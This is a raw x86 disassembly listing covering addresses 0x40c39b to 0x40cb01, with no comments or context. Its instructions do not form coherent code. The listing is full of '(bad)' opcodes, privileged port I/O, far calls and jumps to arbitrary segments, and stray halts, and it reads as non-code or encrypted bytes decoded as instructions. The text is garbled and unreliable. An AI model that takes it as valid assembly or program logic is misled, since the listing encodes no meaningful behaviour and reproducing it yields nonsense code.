  40c39b:	clc    
  40c39c:	test   al,0xdc
  40c39e:	arpl   WORD PTR [ebx],di
  40c3a0:	fcmovu st,st(2)
  40c3a2:	mov    esp,0x71b0d1f
  40c3a7:	les    ecx,FWORD PTR [edx]
  40c3a9:	(bad)  
  40c3ab:	jns    0x40c38b
  40c3ad:	mov    cs,WORD PTR [esi-0x6cdc01c5]
  40c3b3:	fstp   TBYTE PTR [eax+edx*2+0xc2baf93]
  40c3ba:	rcl    DWORD PTR ds:0xcda8413c,cl
  40c3c0:	jno    0x40c43a
  40c3c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c3c3:	mov    BYTE PTR [ebx-0x4cd845ab],cl
  40c3c9:	mov    dh,BYTE PTR [edi+0x4604b56c]
  40c3cf:	pop    edx
  40c3d0:	repnz mov ds:0xadc817c9,al
  40c3d6:	out    dx,al
  40c3d7:	out    dx,eax
  40c3d8:	push   edi
  40c3d9:	in     al,0x32
  40c3db:	(bad)  
  40c3dc:	mov    esp,0x91bb0fb5
  40c3e1:	push   0xffffff84
  40c3e3:	scas   al,BYTE PTR es:[edi]
  40c3e4:	ss jle 0x40c40c
  40c3e7:	ins    DWORD PTR es:[edi],dx
  40c3e8:	pop    ecx
  40c3e9:	enter  0x5685,0x38
  40c3ed:	mov    eax,0x2151aab6
  40c3f2:	pop    eax
  40c3f3:	push   esp
  40c3f4:	test   DWORD PTR [edi+0x7ada4fa2],ebp
  40c3fa:	inc    eax
  40c3fb:	lods   al,BYTE PTR ds:[esi]
  40c3fc:	add    eax,0x795b418
  40c401:	xchg   edi,eax
  40c402:	inc    edx
  40c403:	aad    0xaf
  40c405:	pusha  
  40c406:	jp     0x40c3fa
  40c408:	mov    ecx,0xc50a212a
  40c40d:	lahf   
  40c40e:	and    dh,BYTE PTR [ebx-0x41]
  40c411:	push   0x15
  40c413:	adc    eax,0xb857303c
  40c418:	lea    ebx,[edx+esi*4+0x2f]
  40c41c:	stos   BYTE PTR es:[edi],al
  40c41d:	lds    ebx,FWORD PTR [esi+0x31]
  40c420:	dec    edx
  40c421:	bound  edi,QWORD PTR [esp+ebp*4-0x5d]
  40c425:	icebp  
  40c426:	pop    ecx
  40c427:	lods   al,BYTE PTR ds:[esi]
  40c428:	loop   0x40c48f
  40c42a:	add    al,ch
  40c42c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c42d:	(bad)  
  40c42e:	pop    esp
  40c42f:	and    DWORD PTR [edi],esp
  40c431:	jmp    0x40c3ce
  40c433:	fs pop ds
  40c435:	retf   
  40c436:	aas    
  40c437:	or     ecx,DWORD PTR [ecx+ebp*8]
  40c43a:	cmp    al,0x47
  40c43c:	adc    ch,BYTE PTR [esi-0x47]
  40c43f:	(bad)  
  40c440:	and    DWORD PTR [edx+ebp*4-0x18],eax
  40c444:	shl    DWORD PTR [eax-0x5c255429],1
  40c44a:	sahf   
  40c44b:	push   0xfffffffb
  40c44d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c44e:	pop    DWORD PTR [ecx+eiz*8]
  40c451:	inc    eax
  40c452:	inc    eax
  40c453:	cmp    al,al
  40c455:	out    dx,al
  40c456:	cmp    BYTE PTR [ecx-0x72ab3e18],0x5e
  40c45d:	call   0x865f:0xdee3a563
  40c464:	cmp    eax,DWORD PTR [ebx+0x744151eb]
  40c46a:	jp     0x40c47d
  40c46c:	xchg   esi,ebp
  40c46e:	add    DWORD PTR [ebp+0x50],0xffffffa8
  40c472:	add    BYTE PTR [edi+eax*4+0x7f590f3b],dl
  40c479:	rcr    DWORD PTR [ecx],0x47
  40c47c:	or     eax,0x20631ae6
  40c481:	mov    ds:0x49725d55,eax
  40c486:	jmp    0x40c463
  40c488:	xchg   ecx,eax
  40c489:	dec    ebp
  40c48a:	icebp  
  40c48b:	xor    BYTE PTR [esi+0x27],ch
  40c48e:	mov    edx,ebp
  40c490:	push   ebp
  40c491:	cdq    
  40c492:	jecxz  0x40c4b4
  40c494:	rcl    DWORD PTR [ebx+0x5393045e],0x3a
  40c49b:	mov    eax,0x5dbf72bb
  40c4a0:	dec    edx
  40c4a1:	or     esp,esp
  40c4a3:	adc    al,BYTE PTR [eax]
  40c4a5:	push   0x87b49632
  40c4aa:	rcr    DWORD PTR [eax-0x5d],cl
  40c4ad:	mov    cl,0x79
  40c4af:	dec    esp
  40c4b0:	dec    esi
  40c4b1:	daa    
  40c4b2:	add    eax,0x79c20762
  40c4b7:	rcl    DWORD PTR ds:0x6cda5c5f,0xff
  40c4be:	jns    0x40c474
  40c4c0:	xchg   BYTE PTR [esi-0x42717890],al
  40c4c6:	and    al,0xc8
  40c4c8:	sbb    al,0xeb
  40c4ca:	inc    eax
  40c4cb:	jle    0x40c4f1
  40c4cd:	sar    DWORD PTR [ebx+0x1b],1
  40c4d0:	and    DWORD PTR [edx-0x5adefefc],ecx
  40c4d6:	pop    eax
  40c4d7:	call   0x1a4c:0x3a43d730
  40c4de:	inc    ebx
  40c4df:	jmp    0x43b90ec2
  40c4e4:	jmp    0x5c17bea
  40c4e9:	mov    dl,BYTE PTR [ebx+0x20]
  40c4ec:	call   0xbe2a9209
  40c4f1:	in     eax,dx
  40c4f2:	lods   eax,DWORD PTR ds:[esi]
  40c4f3:	xchg   DWORD PTR [eax-0x72],eax
  40c4f6:	loop   0x40c521
  40c4f8:	xchg   ebp,eax
  40c4f9:	std    
  40c4fa:	push   esi
  40c4fb:	jge    0x40c503
  40c4fd:	xlat   BYTE PTR ds:[ebx]
  40c4fe:	or     ebx,DWORD PTR [eax+0x3f1b136e]
  40c504:	xchg   ecx,eax
  40c505:	add    eax,0x1101c32d
  40c50a:	ret    
  40c50b:	adc    dh,dh
  40c50d:	pop    es
  40c50e:	lock jecxz 0x40c502
  40c511:	xchg   ebx,eax
  40c512:	jae    0x40c49b
  40c514:	push   ds
  40c515:	or     DWORD PTR [edi],eax
  40c517:	jl     0x40c57b
  40c519:	xchg   BYTE PTR [eax+0x75],bh
  40c51c:	sub    al,0xe3
  40c51e:	fsubr  st(5),st
  40c520:	leave  
  40c521:	call   0xe5ef:0x5f155ce7
  40c528:	dec    ebx
  40c529:	pusha  
  40c52a:	adc    edx,DWORD PTR [esi-0x242300a2]
  40c530:	pop    edx
  40c531:	and    BYTE PTR [edx-0x457ffd],cl
  40c537:	mov    ebx,0xa4818c27
  40c53c:	cmp    DWORD PTR [ecx+0x78f3277e],ecx
  40c542:	out    0x2c,ax
  40c545:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c546:	jge    0x40c556
  40c548:	mov    cs,ecx
  40c54a:	cmp    al,0x8e
  40c54c:	sbb    esp,ecx
  40c54e:	mov    eax,ds:0x9ebc0276
  40c553:	ja     0x40c5ce
  40c555:	or     esp,ecx
  40c557:	fiadd  WORD PTR [esi+0x23ba7bf9]
  40c55d:	shl    BYTE PTR [edi+0x2b],cl
  40c560:	jmp    FWORD PTR [eax-0x4c]
  40c563:	test   DWORD PTR [ecx],edx
  40c565:	adc    bh,cl
  40c567:	adc    ebx,esp
  40c569:	jl     0x40c544
  40c56b:	mov    BYTE PTR [edx+ebx*1],bh
  40c56e:	imul   edi,DWORD PTR [eax-0x3d526eab],0x8f0520ee
  40c578:	fdiv   DWORD PTR [esi+0x17a22f9f]
  40c57e:	mov    al,ds:0xe9a8852e
  40c583:	lods   al,BYTE PTR ds:[esi]
  40c584:	jg     0x40c53b
  40c586:	sar    ecx,0xbd
  40c589:	mov    ch,0xcb
  40c58b:	sub    eax,0x75c84693
  40c590:	push   eax
  40c591:	jge    0x40c545
  40c593:	xchg   esi,eax
  40c594:	push   0xa0db1108
  40c599:	aas    
  40c59a:	inc    edx
  40c59b:	and    ch,BYTE PTR ds:0x8d2d1820
  40c5a1:	popf   
  40c5a2:	sbb    DWORD PTR [ebx-0x4304c67e],0xacfa17bd
  40c5ac:	push   di
  40c5ae:	xchg   dh,bl
  40c5b0:	in     al,dx
  40c5b1:	(bad)  
  40c5b2:	rcr    DWORD PTR [esi],1
  40c5b4:	pop    ebx
  40c5b5:	and    BYTE PTR [ecx],dl
  40c5b7:	mov    esi,0x13a2884
  40c5bc:	repnz xchg ebp,eax
  40c5be:	adc    al,0x15
  40c5c0:	icebp  
  40c5c1:	scas   al,BYTE PTR es:[edi]
  40c5c2:	aaa    
  40c5c3:	xor    bl,BYTE PTR [ecx+edx*4+0x787cee44]
  40c5ca:	lds    ebx,FWORD PTR [edx+0x358cfa6d]
  40c5d0:	mov    esp,0xe6885ba3
  40c5d5:	scas   al,BYTE PTR es:[edi]
  40c5d6:	dec    eax
  40c5d7:	adc    al,0xcf
  40c5d9:	add    cl,dl
  40c5db:	out    0xd1,eax
  40c5dd:	mov    bl,0x49
  40c5df:	pop    edi
  40c5e0:	add    al,0x4c
  40c5e2:	stc    
  40c5e3:	nop
  40c5e4:	jbe    0x40c645
  40c5e6:	dec    esi
  40c5e7:	and    bh,ch
  40c5e9:	and    BYTE PTR [esi+ebx*4+0x1181a677],bh
  40c5f0:	in     eax,dx
  40c5f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5f2:	stos   BYTE PTR es:[edi],al
  40c5f3:	sar    BYTE PTR [ebx],1
  40c5f5:	test   eax,0xc00ee4a0
  40c5fa:	xor    cl,al
  40c5fc:	pop    ebx
  40c5fd:	dec    edi
  40c5fe:	stc    
  40c5ff:	in     eax,0xf5
  40c601:	push   ebp
  40c602:	xor    al,0xd4
  40c604:	aad    0x9b
  40c606:	iret   
  40c607:	es sbb al,0x45
  40c60a:	mov    al,ds:0xa395fc08
  40c60f:	mul    BYTE PTR [esp+edi*2]
  40c612:	jno    0x40c5c4
  40c614:	or     bl,BYTE PTR [ebx-0x22074051]
  40c61a:	mov    DWORD PTR [edi+0x69],0xb30d4047
  40c621:	cmp    DWORD PTR [ebp+0x5d6a1cb4],ebx
  40c627:	jp     0x40c5cd
  40c629:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c62a:	cmp    bl,bl
  40c62c:	sub    cl,BYTE PTR [ebx]
  40c62e:	clc    
  40c62f:	std    
  40c630:	adc    DWORD PTR [edx-0x5e],ebx
  40c633:	in     al,dx
  40c634:	sub    DWORD PTR [edi],ebx
  40c636:	adc    eax,0xa0ac6aab
  40c63b:	in     al,0xc5
  40c63d:	xchg   ecx,eax
  40c63e:	mov    ebp,0x4a13313c
  40c643:	dec    ebp
  40c644:	ja     0x40c647
  40c646:	adc    dl,BYTE PTR [ebx]
  40c648:	dec    esi
  40c649:	adc    BYTE PTR [edi],dh
  40c64b:	sbb    BYTE PTR [ebp-0x62],al
  40c64e:	sbb    eax,0x76f37fe
  40c653:	sti    
  40c654:	add    BYTE PTR [ebx-0x1fa9b251],ch
  40c65a:	imul   esp,DWORD PTR gs:[esi+eax*2+0x441764a2],0x6b
  40c663:	scas   al,BYTE PTR es:[edi]
  40c664:	xor    BYTE PTR [edx+0xb],cl
  40c667:	fbstp  TBYTE PTR [ebx-0x63]
  40c66a:	adc    DWORD PTR [ebx],eax
  40c66c:	stos   BYTE PTR es:[edi],al
  40c66d:	sub    DWORD PTR [ebx],ebx
  40c66f:	xchg   edi,eax
  40c670:	push   ebp
  40c671:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c672:	sub    eax,0xf65aa380
  40c677:	mov    BYTE PTR [ecx],bh
  40c679:	xchg   BYTE PTR [ecx],bh
  40c67b:	mov    ds:0x33122bef,al
  40c680:	in     eax,0xbd
  40c682:	or     al,0xd4
  40c684:	mov    bh,BYTE PTR [edi]
  40c686:	stos   BYTE PTR es:[edi],al
  40c687:	pushf  
  40c688:	cmp    ebx,DWORD PTR [esi]
  40c68a:	mov    ecx,0x7a027439
  40c68f:	cwde   
  40c690:	int3   
  40c691:	(bad)  
  40c692:	fidivr DWORD PTR ds:0xf3d7b535
  40c698:	xchg   DWORD PTR [ecx],ebx
  40c69a:	ret    0x7630
  40c69d:	data16 sahf 
  40c69f:	xchg   DWORD PTR [eax],eax
  40c6a1:	adc    ah,BYTE PTR ds:0xc6d6d27f
  40c6a7:	aas    
  40c6a8:	fdivr  st,st(2)
  40c6aa:	cmp    eax,0x862d5ef8
  40c6af:	and    bh,BYTE PTR [ebp+0x1d7475ab]
  40c6b5:	lock inc edi
  40c6b7:	mov    bl,0x29
  40c6b9:	inc    ebp
  40c6ba:	mov    edi,0x55595d02
  40c6bf:	push   eax
  40c6c0:	ret    
  40c6c1:	pop    esp
  40c6c2:	scas   eax,DWORD PTR es:[edi]
  40c6c3:	xchg   edi,eax
  40c6c4:	mov    ds:0x6aec863,eax
  40c6c9:	jae    0x40c71a
  40c6cb:	sbb    dh,cl
  40c6cd:	test   al,0x36
  40c6cf:	pop    esp
  40c6d0:	push   ebx
  40c6d1:	aam    0x3e
  40c6d3:	or     DWORD PTR [edi],edx
  40c6d5:	pop    ds
  40c6d6:	mov    ch,0xfe
  40c6d8:	ins    BYTE PTR es:[edi],dx
  40c6d9:	cmp    BYTE PTR [ecx+ecx*4-0xd],0x9f
  40c6de:	mov    ds:0x38f0bc53,eax
  40c6e3:	mov    al,0xd8
  40c6e5:	adc    ebp,esi
  40c6e7:	jmp    FWORD PTR [esi+ecx*1]
  40c6ea:	push   ebx
  40c6eb:	xor    BYTE PTR [ecx+0x5b],ah
  40c6ee:	dec    esi
  40c6ef:	mov    edx,0x1911d701
  40c6f4:	and    ebp,DWORD PTR [edi-0x50b31bd1]
  40c6fa:	mov    ds:0x8f632633,eax
  40c6ff:	test   al,0x71
  40c701:	mov    ah,0xd6
  40c703:	test   eax,0x1aff92a9
  40c708:	into   
  40c709:	aaa    
  40c70a:	outs   dx,BYTE PTR ds:[esi]
  40c70b:	loopne 0x40c6ce
  40c70d:	xor    eax,0xa0fa929b
  40c712:	xor    al,0x8
  40c714:	aas    
  40c715:	fisubr WORD PTR [ecx+0x64aa5368]
  40c71b:	aad    0x8f
  40c71d:	jle    0x40c750
  40c71f:	inc    ecx
  40c720:	or     eax,0x1abb97ce
  40c725:	mov    ebp,0x7d6b6f12
  40c72a:	leave  
  40c72b:	adc    edx,DWORD PTR [edi+ecx*4]
  40c72e:	sub    BYTE PTR [ebx],0x67
  40c731:	(bad)  
  40c732:	in     eax,0xe7
  40c734:	xchg   edx,eax
  40c735:	mov    edx,0x8c5a1b37
  40c73a:	out    0x50,eax
  40c73c:	clc    
  40c73d:	repz mov WORD PTR [ebx+0x4eb45dfa],cs
  40c744:	gs ins BYTE PTR es:[edi],dx
  40c746:	out    0x1b,al
  40c748:	pop    ds
  40c749:	sub    esi,DWORD PTR [ebp+0x2c9183aa]
  40c74f:	xchg   esi,eax
  40c750:	inc    ebp
  40c751:	repz aas 
  40c753:	stos   DWORD PTR es:[edi],eax
  40c754:	dec    ecx
  40c755:	scas   eax,DWORD PTR es:[edi]
  40c756:	push   0xffffffa3
  40c758:	ja     0x40c795
  40c75a:	sub    eax,0x8afa8748
  40c75f:	inc    edx
  40c760:	mov    esi,0x3639d610
  40c765:	lock imul ecx,DWORD PTR [edx-0x270ac07c],0x243aa3ee
  40c770:	xchg   DWORD PTR [ecx-0x650f5650],edi
  40c776:	out    0x84,al
  40c778:	xor    dl,BYTE PTR [esi+0x383a509c]
  40c77e:	inc    edx
  40c77f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c780:	add    al,0x74
  40c782:	mov    bh,0xd7
  40c784:	add    ecx,DWORD PTR [eax+edx*4-0x79c395cc]
  40c78b:	pop    eax
  40c78c:	xchg   ecx,eax
  40c78d:	stos   DWORD PTR es:[edi],eax
  40c78e:	rol    esp,cl
  40c790:	in     al,dx
  40c791:	sbb    esi,DWORD PTR [eax+0x188979f]
  40c797:	stos   DWORD PTR es:[edi],eax
  40c798:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c799:	mov    ebp,0x60c83b56
  40c79e:	cmp    dl,BYTE PTR [edx+0x54]
  40c7a1:	outs   dx,BYTE PTR ds:[esi]
  40c7a2:	dec    esp
  40c7a3:	jb     0x40c7ef
  40c7a5:	pop    ds
  40c7a6:	sub    DWORD PTR [ebx],ebx
  40c7a8:	ja     0x40c810
  40c7aa:	ins    BYTE PTR es:[edi],dx
  40c7ab:	mov    cl,0x6c
  40c7ad:	sahf   
  40c7ae:	das    
  40c7af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c7b0:	mov    dh,0x29
  40c7b2:	push   edi
  40c7b3:	jo     0x40c7c4
  40c7b5:	ror    BYTE PTR [ecx-0x18],1
  40c7b8:	adc    al,0x75
  40c7ba:	pusha  
  40c7bb:	push   cs
  40c7bc:	xor    edx,esi
  40c7be:	pop    ecx
  40c7bf:	fsub   QWORD PTR [ebx]
  40c7c1:	fistp  DWORD PTR [ebp+0x6]
  40c7c4:	ja     0x40c7ec
  40c7c6:	hlt    
  40c7c7:	stos   DWORD PTR es:[edi],eax
  40c7c8:	aas    
  40c7c9:	or     DWORD PTR fs:[ebp-0x606c8b67],0xffffffb3
  40c7d1:	hlt    
  40c7d2:	inc    edi
  40c7d3:	into   
  40c7d4:	call   0xf5df:0x44fec48b
  40c7db:	inc    esi
  40c7dc:	and    al,0x18
  40c7de:	(bad)  
  40c7df:	cmp    edi,DWORD PTR [esi-0x4e570484]
  40c7e5:	push   cs
  40c7e6:	stc    
  40c7e7:	jbe    0x40c7ac
  40c7e9:	mov    edx,0x817ae250
  40c7ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c7ef:	jno    0x40c86c
  40c7f1:	and    BYTE PTR [esi],0xa2
  40c7f4:	mov    eax,0xecec4c33
  40c7f9:	sbb    bl,cl
  40c7fb:	mov    cl,0xe
  40c7fd:	hlt    
  40c7fe:	jmp    0x1fc60c83
  40c803:	sti    
  40c804:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c805:	sbb    al,0xc7
  40c807:	scas   eax,DWORD PTR es:[edi]
  40c808:	push   ebx
  40c809:	js     0x40c7a7
  40c80b:	or     BYTE PTR [ebx-0x19ae18de],al
  40c811:	mov    dh,0xd7
  40c813:	shl    BYTE PTR [ebx-0x26d3e998],1
  40c819:	inc    eax
  40c81a:	push   ds
  40c81b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c81c:	add    eax,0xc01370f6
  40c821:	dec    ebx
  40c822:	or     dl,BYTE PTR [eax-0x53]
  40c825:	scas   al,BYTE PTR es:[edi]
  40c826:	mov    bh,0xe1
  40c828:	in     al,0xfd
  40c82a:	retf   
  40c82b:	loope  0x40c8aa
  40c82d:	ins    BYTE PTR es:[edi],dx
  40c82e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c82f:	int    0xe9
  40c831:	fst    QWORD PTR [ecx]
  40c833:	(bad)  [esp+ecx*2+0x3a]
  40c837:	inc    ecx
  40c838:	pop    edi
  40c839:	sub    DWORD PTR ds:0xae456d0c,ecx
  40c83f:	scas   eax,DWORD PTR es:[edi]
  40c840:	push   ecx
  40c841:	(bad)  
  40c842:	add    cl,BYTE PTR ss:[eax-0x55af7df0]
  40c849:	std    
  40c84a:	push   edi
  40c84b:	fs ret 0x4c2b
  40c84f:	(bad)  
  40c850:	arpl   WORD PTR [edx-0x72984938],dx
  40c856:	inc    edi
  40c857:	shl    DWORD PTR [edi+0x4e120b59],cl
  40c85d:	test   eax,0xe34e5c7c
  40c862:	shl    edi,0xe4
  40c865:	popa   
  40c866:	pop    ebp
  40c868:	cmp    ebx,DWORD PTR [edx-0x72]
  40c86b:	pop    ss
  40c86c:	mov    ds:0xd47633c3,al
  40c871:	fdivp  st(5),st
  40c873:	add    eax,0xb25f5ae5
  40c878:	call   0x887b15a1
  40c87d:	push   es
  40c87e:	adc    al,0x89
  40c880:	ret    0xd7b
  40c883:	dec    eax
  40c884:	addr16 retf 
  40c886:	push   esi
  40c887:	sbb    eax,0xc7ae6fa9
  40c88c:	mov    ecx,0x38f18aaa
  40c891:	push   edi
  40c892:	xchg   DWORD PTR [eax+0x31741d1],ebp
  40c898:	mov    cl,al
  40c89a:	adc    al,0x9d
  40c89c:	adc    ebp,edi
  40c89e:	sub    BYTE PTR [edi+0x4987d5c9],dh
  40c8a4:	pop    edi
  40c8a5:	ss sbb edx,esp
  40c8a8:	lods   al,BYTE PTR ds:[esi]
  40c8a9:	mov    dh,0xa1
  40c8ab:	pop    esi
  40c8ac:	mov    bl,0xc1
  40c8ae:	cmp    ebx,edi
  40c8b0:	popf   
  40c8b1:	or     ebx,DWORD PTR [esi+0x211f3179]
  40c8b7:	not    DWORD PTR [ecx+0x36]
  40c8ba:	enter  0xb20e,0xd5
  40c8be:	aas    
  40c8bf:	xchg   BYTE PTR [edx-0x79],cl
  40c8c2:	dec    esp
  40c8c3:	cmp    BYTE PTR ds:0xf89db00,cl
  40c8c9:	clc    
  40c8ca:	or     bh,BYTE PTR [eax]
  40c8cc:	sbb    al,0xa
  40c8ce:	popa   
  40c8cf:	jl     0x40c8e8
  40c8d1:	inc    ebx
  40c8d2:	or     esi,0xffffffd1
  40c8d5:	pop    es
  40c8d6:	shr    DWORD PTR [edi+0x138e33c6],1
  40c8dc:	and    eax,0xb5949f80
  40c8e1:	add    BYTE PTR [edi],0x14
  40c8e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c8e5:	dec    ebx
  40c8e6:	stc    
  40c8e7:	in     eax,dx
  40c8e8:	outs   dx,BYTE PTR ds:[esi]
  40c8e9:	stos   DWORD PTR es:[edi],eax
  40c8ea:	test   BYTE PTR [eax-0xf],dh
  40c8ed:	jae    0x40c92a
  40c8ef:	aam    0x3a
  40c8f1:	dec    eax
  40c8f2:	sub    ch,BYTE PTR [edx]
  40c8f4:	mov    ebx,0xcbe54aff
  40c8f9:	in     eax,0x8a
  40c8fb:	inc    esp
  40c8fc:	mov    bh,0xe0
  40c8fe:	cmp    DWORD PTR [ebp-0x19],esp
  40c901:	out    dx,eax
  40c902:	aam    0xa6
  40c904:	mov    ch,0x8d
  40c906:	pop    es
  40c907:	outs   dx,BYTE PTR ds:[esi]
  40c908:	push   edi
  40c909:	mov    ebx,0x9280422e
  40c90e:	jmp    0x4728836b
  40c913:	inc    ebp
  40c914:	in     eax,dx
  40c915:	aaa    
  40c916:	sar    dl,cl
  40c918:	jl     0x40c995
  40c91a:	les    esi,FWORD PTR [edx+0x5fdb44f9]
  40c920:	call   0x4f5a6a04
  40c925:	clc    
  40c926:	fiadd  WORD PTR [ebx+0x2094ed07]
  40c92c:	sbb    eax,0x2a362036
  40c931:	mov    ch,0x42
  40c933:	ins    BYTE PTR es:[edi],dx
  40c934:	imul   ecx,DWORD PTR [esp+eax*1],0x8fbb1e8b
  40c93b:	cli    
  40c93c:	xchg   BYTE PTR [edx+0x65],cl
  40c93f:	js     0x40c90b
  40c941:	push   cs
  40c942:	rcr    BYTE PTR [edi],1
  40c944:	sti    
  40c945:	mov    ebp,0x517ddfc5
  40c94a:	mov    edx,0x2a7dcf86
  40c94f:	cmp    bh,BYTE PTR [esi]
  40c951:	pushf  
  40c952:	xchg   DWORD PTR [ebp+eiz*4-0x72],esi
  40c956:	or     al,0x9c
  40c958:	call   0x8702:0x3ba88f9e
  40c95f:	ins    DWORD PTR es:[edi],dx
  40c960:	idiv   BYTE PTR [edi]
  40c962:	fcom   QWORD PTR [ebx]
  40c964:	outs   dx,BYTE PTR ds:[esi]
  40c965:	rol    DWORD PTR [edx-0x39],1
  40c968:	mov    ebx,0x60e8e6b6
  40c96d:	jmp    0x40c910
  40c96f:	mov    eax,0x8c1d3a56
  40c974:	pop    esp
  40c975:	call   0xf0908af4
  40c97a:	xchg   ebx,eax
  40c97b:	stos   DWORD PTR es:[edi],eax
  40c97c:	pop    edx
  40c97d:	fucomi st,st(5)
  40c97f:	adc    bh,BYTE PTR [ebp+0x3fd475e1]
  40c985:	pop    ebp
  40c986:	cwde   
  40c987:	adc    eax,0xea283635
  40c98c:	sub    al,0x2c
  40c98e:	neg    BYTE PTR [ebp+0x2]
  40c991:	test   eax,0x9f230ab9
  40c996:	inc    eax
  40c997:	dec    ebx
  40c998:	pop    eax
  40c999:	cmp    bl,BYTE PTR [eax-0x1d]
  40c99c:	sub    DWORD PTR [esi-0xcfb8d80],esp
  40c9a2:	out    0x56,al
  40c9a4:	mov    DWORD PTR [edi+0x21],0xeac36349
  40c9ab:	fwait
  40c9ac:	inc    esp
  40c9ad:	jae    0x40ca0f
  40c9af:	cmp    al,0xf8
  40c9b1:	das    
  40c9b2:	test   DWORD PTR [ecx],ebx
  40c9b4:	sub    al,0xc2
  40c9b6:	sbb    eax,0x46c23fb2
  40c9bb:	ins    BYTE PTR es:[edi],dx
  40c9bc:	arpl   WORD PTR [edi+esi*8-0x4eff9593],di
  40c9c3:	dec    edx
  40c9c4:	repnz movs BYTE PTR es:[di],BYTE PTR ds:[si]
  40c9c7:	xchg   BYTE PTR [ebx-0x7248a4e1],dl
  40c9cd:	inc    esi
  40c9ce:	ins    BYTE PTR es:[edi],dx
  40c9cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9d1:	jb     0x40ca00
  40c9d3:	sar    DWORD PTR ss:[edx],0x15
  40c9d7:	pop    edi
  40c9d8:	cmp    eax,0x6c641c17
  40c9dd:	lea    edi,[edx+0x46]
  40c9e0:	adc    eax,0x8d9f7b7
  40c9e5:	imul   eax,DWORD PTR [ecx],0x67
  40c9e8:	mov    edi,0x3bc40e2f
  40c9ed:	push   ecx
  40c9ee:	xchg   esi,eax
  40c9ef:	and    eax,0xe5eb20bf
  40c9f4:	pop    ecx
  40c9f5:	mov    cs,WORD PTR [esi+eiz*4]
  40c9f8:	dec    ebp
  40c9f9:	hlt    
  40c9fa:	cmp    dh,BYTE PTR ds:0xddf75c07
  40ca00:	dec    BYTE PTR ds:[ecx]
  40ca03:	ja     0x40c9dd
  40ca05:	adc    DWORD PTR [eax+0x76c88bdc],edx
  40ca0b:	outs   dx,BYTE PTR ds:[esi]
  40ca0c:	scas   eax,DWORD PTR es:[edi]
  40ca0d:	or     dl,bh
  40ca0f:	push   edi
  40ca10:	and    BYTE PTR [ecx-0x2f],0x43
  40ca14:	dec    ecx
  40ca15:	jbe    0x40ca75
  40ca17:	sar    BYTE PTR [eax+0x29],0xa6
  40ca1b:	les    esp,FWORD PTR [edx]
  40ca1d:	call   0xa8e8928e
  40ca22:	aas    
  40ca23:	retf   0x3611
  40ca26:	rol    BYTE PTR [ebx+0x782ab1dd],cl
  40ca2c:	pop    esi
  40ca2d:	les    edx,FWORD PTR [edi-0x51e0e368]
  40ca33:	popa   
  40ca34:	sub    BYTE PTR [esi+esi*2+0x3d80a66],0x75
  40ca3c:	cmp    DWORD PTR [edi],esp
  40ca3e:	ret    
  40ca3f:	and    al,ch
  40ca41:	or     esi,DWORD PTR [esi]
  40ca43:	pop    edx
  40ca44:	xor    eax,0xd0b8f2d9
  40ca49:	pop    ds
  40ca4a:	inc    ebp
  40ca4b:	inc    eax
  40ca4c:	dec    esi
  40ca4d:	and    al,0x3b
  40ca4f:	jo     0x40caa1
  40ca51:	call   0xd165212
  40ca56:	add    BYTE PTR [ebx],ch
  40ca58:	mov    dh,0x5
  40ca5a:	and    ah,BYTE PTR ds:0xafcecdd6
  40ca60:	xor    ebx,DWORD PTR [eax+0x61]
  40ca63:	(bad)  
  40ca64:	arpl   WORD PTR [ebp+0x7ad02c65],bx
  40ca6a:	loope  0x40ca0c
  40ca6c:	ins    DWORD PTR es:[edi],dx
  40ca6d:	xchg   ecx,eax
  40ca6e:	stc    
  40ca6f:	lea    edx,[eax+edi*4+0x17]
  40ca73:	cdq    
  40ca74:	jle    0x40ca0a
  40ca76:	sub    ah,BYTE PTR [ecx+0x78]
  40ca79:	mov    bh,0x6a
  40ca7b:	push   es
  40ca7c:	test   DWORD PTR [ebx-0xe40415c],ecx
  40ca82:	mov    al,ds:0x7bb6c11a
  40ca87:	mov    bh,0xfd
  40ca89:	jg     0x40ca95
  40ca8b:	ds cmp eax,0x89e9e04
  40ca91:	push   esi
  40ca92:	shl    bl,0x84
  40ca95:	adc    al,0x46
  40ca97:	sub    eax,0x5c78c27b
  40ca9c:	in     al,0x14
  40ca9e:	jno    0x40ca33
  40caa0:	mov    bl,0x49
  40caa2:	pop    ebx
  40caa3:	outs   dx,DWORD PTR ds:[esi]
  40caa4:	mov    ebx,0xc3bfa3bb
  40caa9:	sbb    BYTE PTR [ebx+0x4a],dl
  40caac:	call   0x5491:0x8b0f7ee6
  40cab3:	push   ebp
  40cab4:	and    cl,BYTE PTR [eax+edi*1]
  40cab7:	call   0x9e672d02
  40cabc:	add    al,0x98
  40cabe:	stos   BYTE PTR es:[edi],al
  40cabf:	popf   
  40cac0:	jmp    0xc04b:0x656bb3a5
  40cac7:	xor    eax,0xa2021665
  40cacc:	mov    ?,ecx
  40cace:	out    0xc6,eax
  40cad0:	mov    dl,BYTE PTR [ecx]
  40cad2:	xchg   edi,eax
  40cad3:	aaa    
  40cad4:	add    eax,0x594c8e79
  40cad9:	loop   0x40ca94
  40cadb:	xchg   edx,eax
  40cadc:	sbb    edx,esp
  40cade:	sub    ch,BYTE PTR [edi+esi*4+0x34c7b8a3]
  40cae5:	(bad)  
  40cae6:	sbb    ch,dl
  40cae8:	add    cl,bl
  40caea:	in     eax,0x26
  40caec:	pop    es
  40caed:	gs mov ebx,0x987d6f27
  40caf3:	jp     0x40cadd
  40caf5:	pop    esi
  40caf6:	dec    edi
  40caf7:	add    dl,ch
  40caf9:	and    DWORD PTR [ebx-0x2f56d611],esi
  40caff:	mov    bh,0x73
  40cb01:	in     eax,dx
